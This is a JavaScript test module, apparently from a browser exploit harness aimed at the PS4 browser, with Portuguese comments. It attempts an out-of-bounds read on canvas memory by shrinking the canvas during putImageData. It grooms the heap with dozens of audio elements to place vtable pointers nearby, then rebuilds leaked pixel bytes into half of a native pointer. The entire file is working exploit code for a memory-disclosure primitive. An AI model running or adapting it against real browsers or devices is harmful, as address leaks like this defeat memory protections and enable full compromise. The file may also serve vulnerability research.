
export default {
    id:       'CANVAS_IMAGEDATA_OOB',
    category: 'Graphics',
    risk:     'CRITICAL',
    description:
        'OOB Read na memória gráfica. O Canvas é encolhido síncronamente, mas a pintura ' +
        'dos dados massivos prossegue. O Heap Feng Shui posiciona objetos HTML pesados ' +
        '(elementos <audio>) adjacentes ao buffer libertado para extração de ponteiros C++ (vTables).',

    setup: function() {
        this.results = {};
        this.sandbox = document.getElementById('groomer-sandbox');
        
        this.canvas = document.createElement('canvas');
        this.canvas.width = 50; 
        this.canvas.height = 50;
        this.sandbox.appendChild(this.canvas);
        
        this.ctx = this.canvas.getContext('2d', { willReadFrequently: true });
        
        this.toxicData = this.ctx.createImageData(50, 50);
        this.toxicData.data.fill(0x41); 
    },

    trigger: function() {
        try {
            // 1. O GATILHO: Destrói o backing store do C++
            this.canvas.width = 1; 
            
            // 2. HEAP FENG SHUI: Plantando os Alvos Ricos em Ponteiros
            // Vamos instanciar dezenas de elementos de áudio. Eles criam estruturas
            // HTMLMediaElement gigantes na RAM nativa, repletas de ponteiros vTable.
            this.pointerTargets = [];
            for (let i = 0; i < 40; i++) {
                let el = document.createElement('audio');
                this.sandbox.appendChild(el);
                this.pointerTargets.push(el);
            }
            
            // 3. Força a leitura cega para cima da memória dos elementos de áudio
            this.ctx.putImageData(this.toxicData, 0, 0);
            
            // 4. Extraímos 4 pixels de lixo bruto (16 bytes = 2 ponteiros de 64 bits)
            this.results.leaked = this.ctx.getImageData(0, 0, 4, 1);
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        s => s.results.error || 'Pintura Gráfica Aceite',
        
        // O Extrator de Endereços (Reconstrução Numérica)
        s => {
            if (s.results.leaked) {
                let data = s.results.leaked.data;
                let r = data[0], g = data[1], b = data[2], a = data[3];
                
                // Se leu algo diferente de preto transparente (0) e dos nossos "A"s (65)
                if (r !== 0 && r !== 65) {
                    // Magia de Bitwise: Agrupamos os 4 bytes lidos (RGBA) num único número inteiro de 32-bits.
                    // Isso reconstrói metade de um ponteiro nativo do PS4!
                    let rawValue = (a << 24) | (b << 16) | (g << 8) | r;
                    let unsignedVal = rawValue >>> 0; // Força para unsigned
                    
                    return `💥 LEAK C++ [Metade de Ponteiro]: 0x${unsignedVal.toString(16).toUpperCase()}`;
                }
            }
            return 0; // Seguro
        }
    ],

    cleanup: function() {
        try { this.canvas.remove(); } catch(e){}
        if (this.pointerTargets) {
            this.pointerTargets.forEach(el => { try { el.remove(); } catch(e){} });
        }
        this.pointerTargets = null;
        this.canvas = null;
        this.ctx = null;
        this.toxicData = null;
        this.results = {};
    }
};
